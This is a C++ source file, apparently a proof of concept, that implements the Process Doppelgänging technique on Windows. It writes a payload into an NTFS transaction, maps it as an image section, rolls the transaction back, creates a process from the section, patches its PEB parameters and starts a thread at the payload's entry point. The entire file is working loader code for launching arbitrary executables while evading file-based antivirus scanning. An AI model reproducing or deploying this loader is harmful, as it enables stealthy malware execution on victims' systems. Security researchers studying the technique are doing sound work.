#include <Windows.h>
#include <KtmW32.h>
#include <userenv.h>

#include <iostream>
#include <stdio.h>

#include "ntddk.h"
#include "ntdll_undoc.h"
#include "util.h"

#include "pe_hdrs_helper.h"

#pragma comment(lib, "KtmW32.lib")
#pragma comment(lib, "Ntdll.lib")
#pragma comment(lib, "Userenv.lib")

#define PAGE_SIZE 0x1000

bool set_params_in_peb(PVOID params_base, HANDLE hProcess, PROCESS_BASIC_INFORMATION &pbi)
{
    // Get access to the remote PEB:
    ULONGLONG remote_peb_addr = (ULONGLONG)pbi.PebBaseAddress;
    if (!remote_peb_addr) {
        std::cerr << "Failed getting remote PEB address!" << std::endl;
        return false;
    }
    PEB peb_copy = { 0 };
    ULONGLONG offset = (ULONGLONG)&peb_copy.ProcessParameters - (ULONGLONG)&peb_copy;

    // Calculate offset of the parameters
    LPVOID remote_img_base = (LPVOID)(remote_peb_addr + offset);

    //Write parameters address into PEB:
    SIZE_T written = 0;
    if (!WriteProcessMemory(hProcess, remote_img_base, 
        &params_base, sizeof(PVOID), 
        &written)) 
    {
        std::cout << "Cannot update Params!" << std::endl;
        return false;
    }
    return true;
}

bool buffer_remote_peb(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, OUT PEB &peb_copy)
{
    memset(&peb_copy,0,sizeof(PEB));
    PPEB remote_peb_addr = pi.PebBaseAddress;
#ifdef _DEBUG
    std::cout << "PEB address: " << (std::hex) << (ULONGLONG)remote_peb_addr << std::endl;
#endif 
    // Write the payload's ImageBase into remote process' PEB:
    NTSTATUS status = NtReadVirtualMemory(hProcess, remote_peb_addr, &peb_copy, sizeof(PEB), NULL);
    if (status != STATUS_SUCCESS)
    {
        std::cerr <<"Cannot read remote PEB: "<< GetLastError() << std::endl;
        return false;
    }
    return true;
}

//Preserve the aligmnent! The remote address of the parameters must be the same as local.
LPVOID write_params_into_process(HANDLE hProcess, PRTL_USER_PROCESS_PARAMETERS params, DWORD protect)
{
    if (params == NULL) return NULL;

    PVOID buffer = params;
    ULONG_PTR buffer_end = (ULONG_PTR)params + params->Length;

    //params and environment in one space:
    if (params->Environment) {
        if ((ULONG_PTR)params > (ULONG_PTR)params->Environment) {
            buffer = (PVOID)params->Environment;
        }
        ULONG_PTR env_end = (ULONG_PTR)params->Environment + params->EnvironmentSize;
        if (env_end > buffer_end) {
            buffer_end = env_end;
        }
    }
    // copy the continuous area containing parameters + environment
    SIZE_T buffer_size = buffer_end - (ULONG_PTR)buffer;
    if (VirtualAllocEx(hProcess, buffer, buffer_size, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
        if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
            std::cerr << "Writing RemoteProcessParams failed" << std::endl;
            return nullptr;
        }
        if (params->Environment) {
            if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
                std::cerr << "Writing environment failed" << std::endl;
                return nullptr;
            }
        }
        return (LPVOID)params;
    }

    // could not copy the continuous space, try to fill it as separate chunks:
    if (!VirtualAllocEx(hProcess, (LPVOID)params, params->Length, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
        std::cerr << "Allocating RemoteProcessParams failed" << std::endl;
        return nullptr;
    }
    if (!WriteProcessMemory(hProcess, (LPVOID)params, (LPVOID)params, params->Length, NULL)) {
        std::cerr << "Writing RemoteProcessParams failed" << std::endl;
        return nullptr;
    }
    if (params->Environment) {
        if (!VirtualAllocEx(hProcess, (LPVOID)params->Environment, params->EnvironmentSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE)) {
            std::cerr << "Allocating environment failed" << std::endl;
            return nullptr;
        }
        if (!WriteProcessMemory(hProcess, (LPVOID)params->Environment, (LPVOID)params->Environment, params->EnvironmentSize, NULL)) {
            std::cerr << "Writing environment failed" << std::endl;
            return nullptr;
        }
    }
    return (LPVOID)params;
}

bool setup_process_parameters(HANDLE hProcess, PROCESS_BASIC_INFORMATION &pi, LPWSTR targetPath)
{
    //---
    UNICODE_STRING uTargetPath = { 0 };
    RtlInitUnicodeString(&uTargetPath , targetPath);
    //---
    wchar_t dirPath[MAX_PATH] = { 0 };
    get_directory(targetPath, dirPath, MAX_PATH);
    UNICODE_STRING uCurrentDir = { 0 };
    RtlInitUnicodeString(&uCurrentDir, dirPath);
    //---
    wchar_t dllDir[] = L"C:\\Windows\\System32";
    UNICODE_STRING uDllDir = { 0 };
    RtlInitUnicodeString(&uDllDir, dllDir);
    //---
    UNICODE_STRING uWindowName = { 0 };
    wchar_t *windowName = L"Process Doppelganging test!";
    RtlInitUnicodeString(&uWindowName, windowName);

    LPVOID environment;
    CreateEnvironmentBlock(&environment, NULL, TRUE);

    PRTL_USER_PROCESS_PARAMETERS params  = nullptr;
    NTSTATUS status = RtlCreateProcessParametersEx(
        &params,
        (PUNICODE_STRING) &uTargetPath,
        (PUNICODE_STRING) &uDllDir,
        (PUNICODE_STRING) &uCurrentDir,
        (PUNICODE_STRING) &uTargetPath,
        environment,
        (PUNICODE_STRING) &uWindowName,
        nullptr,
        nullptr,
        nullptr,
        RTL_USER_PROC_PARAMS_NORMALIZED
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "RtlCreateProcessParametersEx failed" << std::endl;
        return false;
    }
    LPVOID remote_params = write_params_into_process(hProcess, params, PAGE_READWRITE);
    if (!remote_params) {
        std::cout << "[+] Cannot make a remote copy of parameters: " << GetLastError() << std::endl;
        return false;
    }
#ifdef _DEBUG
    std::cout << "[+] Parameters mapped!" << std::endl;
#endif
    PEB peb_copy = { 0 };
    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
        return false;
    }

    if (!set_params_in_peb(remote_params, hProcess, pi)) {
        std::cout << "[+] Cannot update PEB: " << GetLastError() << std::endl;
        return false;
    }
#ifdef _DEBUG
    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
        return false;
    }
    std::cout << "> ProcessParameters addr: "<< peb_copy.ProcessParameters << std::endl;
#endif
    return true;
}

bool process_doppel(wchar_t* targetPath, BYTE* payladBuf, DWORD payloadSize)
{
    DWORD options, isolationLvl, isolationFlags, timeout;
    options = isolationLvl = isolationFlags = timeout = 0;

    HANDLE hTransaction = CreateTransaction(nullptr, nullptr, options, isolationLvl, isolationFlags, timeout, nullptr);
    if (hTransaction == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transaction!" << std::endl;
        return false;
    }
    wchar_t* dummy_name = get_file_name(targetPath);
    HANDLE hTransactedFile = CreateFileTransactedW(dummy_name,
        GENERIC_WRITE | GENERIC_READ,
        0,
        NULL,
        CREATE_ALWAYS,
        FILE_ATTRIBUTE_NORMAL,
        NULL,
        hTransaction,
        NULL,
        NULL
    );
    if (hTransactedFile == INVALID_HANDLE_VALUE) {
        std::cerr << "Failed to create transacted file: " <<  GetLastError() << std::endl;
        return false;
    }
    
    DWORD writtenLen = 0;
    if (!WriteFile(hTransactedFile, payladBuf, payloadSize, &writtenLen, NULL)) {
        std::cerr << "Failed writing payload! Error: " <<  GetLastError() << std::endl;
        return false;
    }

    HANDLE hSection = nullptr;
    NTSTATUS status = NtCreateSection(&hSection,
        SECTION_ALL_ACCESS,
        NULL,
        0,
        PAGE_READONLY,
        SEC_IMAGE,
        hTransactedFile
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateSection failed" << std::endl;
        return false;
    }
    CloseHandle(hTransactedFile);
    hTransactedFile = nullptr;

    if (RollbackTransaction(hTransaction) == FALSE) {
        std::cerr << "RollbackTransaction failed: " << std::hex << GetLastError() << std::endl;
        return false;
    }
    CloseHandle(hTransaction);
    hTransaction = nullptr;

    HANDLE hProcess = nullptr;
    status = NtCreateProcessEx(
        &hProcess, //ProcessHandle
        PROCESS_ALL_ACCESS, //DesiredAccess
        NULL, //ObjectAttributes
        NtCurrentProcess(), //ParentProcess
        PS_INHERIT_HANDLES, //Flags
        hSection, //sectionHandle
        NULL, //DebugPort
        NULL, //ExceptionPort
        FALSE //InJob
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateProcessEx failed! Status: " << std::hex << status << std::endl;
        if (status == STATUS_IMAGE_MACHINE_TYPE_MISMATCH) {
            std::cerr << "[!] The payload has mismatching bitness!" << std::endl;
        }
        return false;
    }

    PROCESS_BASIC_INFORMATION pi = { 0 };

    DWORD ReturnLength = 0;
    status = NtQueryInformationProcess(
        hProcess,
        ProcessBasicInformation,
        &pi,
        sizeof(PROCESS_BASIC_INFORMATION),
        &ReturnLength
    );
    if (status != STATUS_SUCCESS) {
        std::cerr << "NtQueryInformationProcess failed" << std::endl;
        return false;
    }
    PEB peb_copy = { 0 };
    if (!buffer_remote_peb(hProcess, pi, peb_copy)) {
        return false;
    }
    ULONGLONG imageBase = (ULONGLONG) peb_copy.ImageBaseAddress;
#ifdef _DEBUG
    std::cout << "ImageBase address: " << (std::hex) << (ULONGLONG)imageBase << std::endl;
#endif
    DWORD payload_ep = get_entry_point_rva(payladBuf);
    ULONGLONG procEntry =  payload_ep + imageBase;

    if (!setup_process_parameters(hProcess, pi, targetPath)) {
        std::cerr << "Parameters setup failed" << std::endl;
        return false;
    }
    std::cout << "[+] Process created! Pid = " << GetProcessId(hProcess) << "\n";
#ifdef _DEBUG
    std::cerr << "EntryPoint at: " << (std::hex) << (ULONGLONG)procEntry << std::endl;
#endif
    HANDLE hThread = NULL;
    status = NtCreateThreadEx(&hThread,
        THREAD_ALL_ACCESS,
        NULL,
        hProcess,
        (LPTHREAD_START_ROUTINE) procEntry,
        NULL,
        FALSE,
        0,
        0,
        0,
        NULL
    );

    if (status != STATUS_SUCCESS) {
        std::cerr << "NtCreateThreadEx failed: " << GetLastError() << std::endl;
        return false;
    }

    return true;
}

int wmain(int argc, wchar_t *argv[])
{
    if (argc < 2) {
        std::cout << "params: <payload path> [*target path]\n" << std::endl;
        std::cout << "* - optional" << std::endl;
        system("pause");
        return 0;
    }
    if (init_ntdll_func() == false) {
        return -1;
    }
    wchar_t defaultTarget[] = L"C:\\Windows\\yolo.txt";
    wchar_t *targetPath = defaultTarget;
    if (argc >= 3) {
        targetPath = argv[2];
    }
    wchar_t *payloadPath = argv[1];
    size_t payloadSize = 0;

    BYTE* payladBuf = buffer_payload(payloadPath, payloadSize);
    if (payladBuf == NULL) {
        std::cerr << "Cannot read payload!" << std::endl;
        return -1;
    }

    bool is_ok = process_doppel(targetPath, payladBuf, (DWORD) payloadSize);

    free_buffer(payladBuf, payloadSize);
    if (is_ok) {
        std::cerr << "[+] Done!" << std::endl;
    } else {
        std::cerr << "[-] Failed!" << std::endl;
#ifdef _DEBUG
        system("pause");
#endif
        return -1;
    }
#ifdef _DEBUG
    system("pause");
#endif
    return 0;
}
